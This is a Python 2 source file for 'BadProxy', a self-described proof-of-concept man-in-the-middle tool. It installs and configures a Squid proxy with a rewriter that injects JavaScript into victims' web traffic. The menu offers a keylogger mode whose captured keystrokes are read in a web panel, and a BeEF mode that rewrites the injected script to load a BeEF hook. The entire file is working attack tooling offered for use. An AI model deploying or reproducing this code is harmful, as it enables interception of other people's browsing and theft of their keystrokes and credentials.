#!/usr/bin/python

RED = '\033[31m'
TAN = '\033[93m'
BLUE = '\033[34m'
CYAN = '\033[36m'
GRAY = '\033[37m'
WHITE = '\033[0m'
GREEN = '\033[32m'
ORANGE = '\033[33m'
PURPLE = '\033[35m'

try:
    from glob import glob
    from re import findall
    from httplib import HTTPConnection
    from subprocess import call, CalledProcessError, check_output, os, STDOUT
except:
    print RED, '[!] Error loading required libraries ..'
    exit()

LOGGERNAME = 'logger.php'
SQUID = '/etc/init.d/squid'
FNULL = open(os.devnull, 'w')
REWRITER = '/etc/squid/poison.py'
PAYLOAD = '/etc/squid/pasarela.js'
SQUID_CONF = '/etc/squid/squid.conf'
CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
POISON = '%s/poison.py' % (CURRENT_PATH, )
HELP_MESSAGE = '''
We hope you're already familiar with MITM attack, and it's what BADPROXY is developed for. Though it's just a POC, it tries to automate things that otherwise you'd have to do manually. It makes things easy- simple Click & GO, and you're ready to FLY. It's easily understandable, and requires no technical knowledge. You may refer to README.MD to get an overview of how BADPROXY works, or visit our GitHub page at https://github.com/ncnew/badproxy. %sThe only hard part is- you're required to change URL (IP/domain) in some places, and in BeEF configuration as well. And, since php systems calls are disabled by default, you're also required to reload squid whenever REWRITER program changes.
%sIf you have any feedback or feature request, please do open an issue in GitHub. Or you if you'd like to contribute, do send us pull requests (one change per commit). We'll shortly upload a demo video at youtube, please be patient.''' % (RED, CYAN)

# redefine quit
def Quit(msg):
  if msg != '':
    print msg
  print '[~] Quitting ...'
  exit()

# redefine write
def Write(fname, content):
  try:
    handle = open(fname, 'w')
  except:
    Quit('\t [~] %s does NOT exists or is Writable' % (fname, ))
  handle.write(content)

# redefine call
def Call(cmd):
  try:
    retcode = call(cmd, stdout=FNULL, stderr=STDOUT)
  except:
    Quit('\t [~] ;( Something went wrong')
  return retcode

# redefine raw_input
def Input(query):
  try:
    opt = raw_input(query)
  except:
    print '\n\n(-_-) How could you be that rude?\n'
    exit()
  if not opt:
    opt = 'Y'
  return opt

# redefine check_output
def CheckOutput(cmd):
  retcode = 0
  try:
    output = check_output(cmd)
  except CalledProcessError as e:
    output = e.output
    retcode = e.returncode
  output = output.strip()
  return output, retcode

def CheckServer():
  servers = ['apache', 'apache2', 'httpd']
  for server in servers:
    output, retcode = CheckOutput(['which', server])
    if not retcode:
      return server

def CheckUser():
  output, retcode = CheckOutput(['id','-u'])
  if output != '0':
    Quit('[!] I must be run as \'root\' ;)')
  else:
    return 'OK'

def CheckInet():
  con = HTTPConnection('www.example.com')
  try:
    con.request('HEAD', '/')
    return 'OK'
  except:
    Quit('[!] Internet NOT Available')

# install squid, may require internet connection

  '''   DEBIAN ONLY   '''
  '''   CHANGE THIS TO SUIT YOUR OS' INSTALLATION INSTRUCTION/COMMAND   '''

def Install():
  pm = PackageManager()
  if pm in ['apt', 'apt-get', 'aptitude']:
    query = [pm, '-y', 'install', 'squid']
  else:
    Quit('\t [~] The script has been written to work with apt-get only.\n\t[i] You can, however, update the function Install() accordingly')
  output, retcode = CheckOutput(query)
  if not retcode:
    print '[!] Installation successful ;)'
  else:
    Quit('[~] :( Something went wrong')
  # resolve dependencies
  # output, retcode = CheckOutput(['apt-get','-yf','install'])
  # if retcode == 0: print '[!] Dependencies resolved ..'
  # run install query again
  # output, retcode = CheckOutput(query)
  # if retcode == 0: print '[!] Installation successful ;)'

def Configure():
  port = Input('\n[i] Enter HTTP PORT (Default 8080): ')
  if not port.isdigit():
    port = 8080

  try:
    from include.poison import ROOT
    from include.files import SCONF
  except:
    Quit('[!] Error loading required libraries ..')

  Write(SQUID_CONF, SCONF)
  try:
    Write(REWRITER, open(POISON).read())
  except:
    Quit('[i] Something went wrong')

  Call(['sed', '-ri', 's,^(http_port )[[:digit:]]+?,\\1'+str(port)+',I', SQUID_CONF])
  Call(['chmod', 'o+w', PAYLOAD])
  Call(['chmod', 'o+wx', REWRITER])
  Call(['ln', '-srf', PAYLOAD, ROOT])
  print '\n\n[~] Congratulations !! It\'s all done now ;)'
  Input('[~] For more info, refer to README.MD')
  Options()

def PackageManager():
  packman = ['apt-get', 'yum', 'pkg_add', 'pkg', 'emerge', 'up2date']
  for pm in packman:
    retcode = Call(['which', pm])

    '''
    man which
    EXIT STATUS
       0      if all specified commands are found and executable
       1      if  one  or  more  specified commands is nonexistent or not executable
       2      if an invalid option is specified
    '''

    if not retcode:
        return pm

SERVER = '/etc/init.d/%s' % (CheckServer(), )

def StartSQUID():
	Call([SQUID, 'start'])
	StartApache()

def StopSquid():
    print ' \t Stopping BadProxy server along with squid and apache..'
    Call([SQUID, 'stop'])
    StopApache()

def ReConfigure():
    Call(['squid', '-k', 'reconfigure'])
    print '\t Reconfiguring the BadProxy Server'

def StartApache():
    Call([SERVER, 'start'])

def StopApache():
    print '\t Stopping apache server ..'
    Call([SERVER,'stop'])
    Input('\t Stopped .... ... .. . ')

def StartGUI():
  try:
      from include.poison import ROOT
  except:
	  Quit('\t [~] Failed to start GUI')

  print '\t [~] Copying proxyboard folder to the apache2 root directory'
  Call(['cp', '-rf', '%s/../proxyboard' % (CURRENT_PATH, ), ROOT])
  # Check in /etc/apache2/envvars > export APACHE_RUN_USER
  Call(['chown', '-R', ':www-data', '%s/proxyboard' % (ROOT, )])
  print '\t [~] Starting Squid proxy server'
  StartSQUID()
  Input('\t [~] Starting GUI at http://127.0.0.1/proxyboard')

def ConfigureBeEF(path):
  path = path[:path.rfind('/')]
  try:
    config = open(path + '/config.yaml').read()
  except:
    pass

  host = findall(r'\shost: "(.+)"', config)[0]
  port = findall(r'\sport: "(.+)"', config)[0]
  path = findall(r'\sweb_ui_basepath: "(.+)"', config)[0]
  hook = host + ':' + port + '/hook.js'
  url = host + ':' + port + path + '/panel'

  print '\t [>] UI URL: http://%s' % (url, )
  Input('\t [>] Hook URL: http://%s ' % (hook, ))

  try:
    from include.files import BEEF
  except:
    Quit('\t [i] Couldn\'t find required libraries')

  Write(PAYLOAD, BEEF)
  Call(['sed', '-ri', 's,(script.src = ).+;,\\1\"'+hook+'\";,I', PAYLOAD])

def FindBeEF():
  print '\t [~] BeEF NOT Found !!'
  print '\t [*] You must start it manually.'
  print '\t [i] Enter path to config.yaml\n'
  print '\t Example: /usr/share/beef-xss/config.yaml'
  path = Input('\t >> ')
  ConfigureBeEF(path)

def StartBeEF():
  DISCLAIMER = '''
\t /---------------------------------------------------\\
\t |We assume your system already has BeEF installed.  |
\t |The BeEF HOOK URL must be publicly accessible. So, |
\t |if you're inside NAT or have a dynamic IP, you may |
\t |need to enable port forward.                       |
\t |For more information, please check your BeEF confi-|
\t |guration file or visit https://github.com/beef-xss/|
\t \---------------------------------------------------/
  '''

  call('clear')
  print '\t '.ljust(26, '-')
  print '\t READ BEFORE YOU CONTINUE'
  print '\t '.ljust(26, '-')

  print DISCLAIMER

  try:
    path = glob('/etc/init.d/beef*')[0]
  except:
    FindBeEF()
    return

  status = Call([path, 'start'])

  if not status:
    print '\t [~] BeEF Services have been started'

  try:
    path = glob('/etc/beef*')[0]
  except:
    Quit('\t [~] We couldn\'t BeEF config.yaml')

  path += '/config.yaml'
  ConfigureBeEF(path)

def Options():
  while True:
	call('clear')
	print GREEN
	print '\t ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
	print '\t + [1] Start SQUID (with Keylogger)                           +'
	print '\t + [2] Start SQUID alongside BeEF (*nix only)                 +'
	print '\t + [3] Manual configuration                                   +'
	print '\t + [4] Start GUI                                              +'
	print '\t + [5] RE-configure SQUID                                     +'
	print '\t + (Run the above options if you find any issue in injection) +'
	print '\t + [6] Stop BadProxy Server                                   +'
	print '\t + [H] HELP                                                   +'
	print '\t ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
	print '\t Press ^C To EXIT'.center(54)

	pref = Input('\t > ')

	print CYAN

	if pref == '1':
	  print '\t [~] Starting SQUID (with JavaScript Keylogger)'
	  print '\t [>] Open http://127.0.0.1/proxyboard to read key logs'
	  try:
  	    from include.poison import TMPPATH
	    from include.files import LOGGER, PASARELA
	  except:
	    Quit('\t [i] Couldn\'t find required libraries ..')
	  StartSQUID()
	  Write(PAYLOAD, PASARELA)
  	  Write(TMPPATH+LOGGERNAME, LOGGER)
	  Input('\t [+] Username: badproxy, password: badproxy ')
  	elif pref == '2':
	  StartSQUID()
	  StartBeEF()
	elif pref == '4':
	  StartGUI()
	elif pref == '3':
	  Input(RED + '\t [?] Manual Settings? ')
	elif pref == '5':
	  ReConfigure()
	elif pref == '6':
	  StopSquid()
	elif pref == 'h' or pref == 'H':
	  Input(HELP_MESSAGE)
